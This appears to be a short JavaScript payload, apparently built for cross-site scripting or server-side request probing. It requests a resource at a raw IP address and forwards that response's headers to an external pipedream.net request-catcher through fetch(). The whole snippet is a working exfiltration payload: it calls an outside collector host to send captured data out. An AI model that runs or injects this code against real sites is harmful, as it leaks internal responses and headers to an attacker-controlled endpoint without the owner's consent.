var xhr = new XMLHttpRequest();
xhr.open("GET", "http://104.27.137.89:80/static/");
xhr.onreadystatechange = function() {
    text = xhr.responseText;
    console.log(xhr.getAllResponseHeaders());
    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + xhr.getAllResponseHeaders());
};
xhr.send(null);
